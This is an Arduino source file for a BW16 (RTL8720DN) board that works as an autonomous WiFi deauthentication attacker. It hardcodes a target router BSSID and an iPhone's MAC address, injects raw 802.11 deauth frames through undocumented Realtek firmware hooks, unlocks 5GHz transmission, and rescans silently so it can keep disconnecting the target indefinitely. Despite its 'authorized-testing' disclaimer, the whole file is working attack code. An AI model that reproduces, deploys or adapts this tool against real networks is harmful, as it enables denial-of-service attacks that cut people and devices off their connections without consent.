/*
   Evil-BW16 hardcoded - autonomous dual-band deauther
   Derived from 7h30th3r0n3/Evil-BW16 (MIT). Educational / authorized-testing use only.

   Behavior: boot -> silently scan to resolve target channel -> deauth forever.
   Re-scans every 30s if the target disappears (router auto-channel changes).

   Proven constants (Ai-Thinker BW16 + realtek:AmebaD 3.1.7):
   injection offset 0xae0, wext_set_channel, channel plan 0x25.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"

//==========================
// Hardcoded config
//==========================
uint8_t TARGET_BSSID[6] = {0x82, 0xA7, 0xB9, 0x84, 0xEB, 0x90};  // Virus C (2.4GHz) AP
uint8_t DST_MAC[6]      = {0x2E, 0x7A, 0xD6, 0x49, 0xE7, 0xF7};  // iPhone (2.4GHz private MAC)
#define FRAMES_PER_CYCLE 10
#define CYCLE_DELAY_MS   1000
#define RESCAN_MS        30000

//==========================
// Frame + injection
//==========================
typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

uint32_t tx_fail = 0, ch_fail = 0, frames = 0;

void wifi_tx_raw_frame(void* f, size_t len) {
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *fc = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);
  if (fc != 0) {
    update_mgntframe_attrib(ptr, fc + 8);
    memset((void *)(*(uint32_t *)(fc + 0x80)), 0, 0x68);
    memcpy((uint8_t *)(*(uint32_t *)(fc + 0x80)) + 0x28, f, len);
    *(uint32_t *)(fc + 0x14) = len;
    *(uint32_t *)(fc + 0x18) = len;
    dump_mgntframe(ptr, fc);
  } else {
    tx_fail++;
  }
}

void sendDeauth() {
  DeauthFrame f;
  memcpy(&f.source, TARGET_BSSID, 6);
  memcpy(&f.access_point, TARGET_BSSID, 6);
  memcpy(&f.destination, DST_MAC, 6);
  f.reason = 2;
  wifi_tx_raw_frame(&f, sizeof(DeauthFrame));
  delay(10);
}

//==========================
// Silent scan: resolve target's current channel
//==========================
int targetChannel = -1;

unsigned long scanHandler(rtw_scan_handler_result_t* res) {
  if (res->scan_complete != 0) return RTW_SUCCESS;
  rtw_scan_result_t* r = &res->ap_details;
  if (memcmp(&r->BSSID, TARGET_BSSID, 6) == 0) targetChannel = r->channel;
  return RTW_SUCCESS;
}

bool resolveChannel() {
  targetChannel = -1;
  if (wifi_scan_networks(scanHandler, NULL) != RTW_SUCCESS) return false;
  for (int i = 0; i < 100 && targetChannel < 0; i++) delay(100);
  return targetChannel >= 0;
}

//==========================
// Main
//==========================
unsigned long lastCycle = 0, lastSeen = 0;

void setup() {
  Serial.begin(115200);
  wifi_on(RTW_MODE_STA);
  wifi_change_channel_plan(0x25);  // unlocks 5GHz TX
  Serial.println("[INFO] boot: resolving target channel...");
}

void loop() {
  if (targetChannel < 0) {
    if (millis() - lastSeen < RESCAN_MS && lastSeen != 0) return;
    if (resolveChannel()) {
      lastSeen = millis();
      Serial.print("[INFO] target on ch "); Serial.println(targetChannel);
    } else {
      Serial.println("[INFO] target not found, rescanning...");
      delay(2000);
    }
    return;
  }
  if (millis() - lastCycle < CYCLE_DELAY_MS) return;
  lastCycle = millis();
  if (wext_set_channel("wlan0", (__u8)targetChannel) != 0) ch_fail++;
  for (int i = 0; i < FRAMES_PER_CYCLE; i++) sendDeauth();
  frames += FRAMES_PER_CYCLE;
  Serial.print("[INFO] "); Serial.print(frames);
  Serial.print(" frames ch "); Serial.print(targetChannel);
  Serial.print(" txfail "); Serial.print(tx_fail);
  Serial.print(" chfail "); Serial.println(ch_fail);
  // periodic re-resolve keeps lock on router auto-channel changes
  if (millis() - lastSeen > RESCAN_MS) {
    targetChannel = -1;  // triggers quiet rescan next loop
    lastSeen = millis() - RESCAN_MS + 5000;  // scan again in ~5s
  }
}
